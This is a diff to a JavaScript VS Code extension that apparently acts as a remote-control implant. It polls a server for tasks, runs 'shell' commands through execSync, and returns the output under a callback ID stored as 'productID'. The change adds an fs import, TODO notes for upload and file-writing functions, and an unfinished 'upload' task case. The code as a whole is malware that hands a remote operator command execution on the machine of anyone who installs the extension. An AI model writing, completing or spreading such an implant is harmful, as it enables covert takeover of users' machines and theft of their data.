@@ -1,4 +1,5 @@
 const vscode = require('vscode');
+const fs = require('fs');
 const os = require('os');
 const { execSync } = require("child_process");
 const url = require('url');
@@ -96,6 +97,9 @@ function getTasking(context) {
 		});
 }
 
+// [ ] add an upload()
+// [ ] add a function to write data to files
+
 function handleTasks(context, tasks) {
 	const callbackUUID = context.globalState.get('productID')
 
@@ -121,6 +125,12 @@ function handleTasks(context, tasks) {
 			case 'shell':
 				const cmd = JSON.parse(parameters)['command']
 				output = execSync(cmd).toString()
+				break
+			case 'upload':
+				const config = JSON.parse(parameters)
+				const remote_path = config['remote_path']
+
+				//output = ...
 				break
 		}
 		postTaskResponse(callbackUUID, taskID, output)
